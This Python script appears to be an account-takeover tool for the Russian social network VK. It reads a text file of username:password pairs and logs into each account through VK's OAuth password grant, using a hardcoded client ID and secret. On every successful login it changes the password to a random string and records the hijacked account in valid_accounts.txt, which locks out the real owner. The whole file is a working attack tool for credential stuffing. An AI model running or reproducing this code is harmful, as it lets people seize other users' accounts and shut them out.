import asyncio
import os
import random
import re
import string

import aiohttp
from vkbottle import API


class VkPasswordChanger:
    def __init__(self):
        self.__url = "https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username={0}&password={1}"
        self.__password_length = 8

    @property
    def __password_generator(self) -> str:
        return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(self.__password_length))

    async def password_change(self, username, password) -> str | bool:
        async with aiohttp.ClientSession() as session:
            async with session.get(self.__url.format(username, password)) as response:
                result = await response.json()
                vk_token = result.get("access_token", 0)
                if vk_token:
                    vk_session = API(token=vk_token)
                    old_password = password
                    new_password = self.__password_generator
                    try:
                        await vk_session.account.change_password(old_password=old_password, new_password=new_password)
                        return new_password
                    except Exception as _:
                        return False
                return False


async def main():
    path_to_file = input("Введите путь до файла (.txt): ")
    if os.path.exists(path_to_file):
        if re.search(r"\.txt$", path_to_file):
            vk = VkPasswordChanger()
            directory = re.match(r"(.*)\\[^\\]*$", path_to_file).group(1)
            with open(file=path_to_file, mode="r", encoding="utf-8") as file:
                for data in file:
                    match data.strip().split(":"):
                        case (username, password):
                            new_password = await vk.password_change(username, password)
                            if new_password:
                                if not os.path.exists(f"{directory}\\valid_accounts.txt"):
                                    with open(f"{directory}\\valid_accounts.txt", 'w'): pass

                                with open(f"{directory}\\valid_accounts.txt", "a") as file:
                                    file.write(f"{username}:{new_password}\n")
        else:
            print("This is not a .txt file")
    else:
        print(f"No such file or directory: {path_to_file}")


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())